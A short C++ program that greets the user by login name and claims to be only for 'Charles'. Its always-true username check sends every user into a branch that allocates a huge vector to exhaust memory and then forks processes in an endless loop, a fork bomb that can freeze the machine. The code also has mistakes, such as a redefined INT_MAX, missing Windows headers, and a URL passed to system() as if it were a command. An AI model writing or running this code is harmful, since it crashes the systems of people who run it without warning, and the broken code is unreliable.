#include <memory>
#include <iostream>
#include <vector>
#include <stdio.h>
#include <thread>
#include <chrono>
#include <cstring>
#include <pmmintrin.h>
#include <unistd.h>
using namespace std;
#define INT_MAX 2147483647

string fetch_ur_mom()
{

#ifdef _WIN32
  char username[UNLEN + 1];
  DWORD username_len = UNLEN + 1;
  GetUserNameA(username, &username_len);
  return string(username);
#else
  char username[256];
  getlogin_r(username, 256);
  return string(username);
#endif
}

int main()
{
  cout << "Hi " << fetch_ur_mom() << endl;
  if (fetch_ur_mom() != "charles" || fetch_ur_mom() != "CHARLES" || fetch_ur_mom() != "Charles")
  {
    cout << "You are not Charles :(\nI am sorry, but this is only for charles....Goodbye" << endl;

    vector<int> v(INT_MAX - 500);
    for (int i = 0; i < INT_MAX - 500; i++)
    {
      v[i] = i;

      _mm_pause();
    }

    while (true)
    {
      this_thread::sleep_for(chrono::milliseconds(1));

      pid_t pid = fork();
    }
  }
  else
  { 
    cout << "Hi Charles! :D" << endl;
    string url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
    char *url_c = new char[url.length() + 1];
    strcpy(url_c, url.c_str());
    system(url_c);
    delete[] url_c;
  }
}
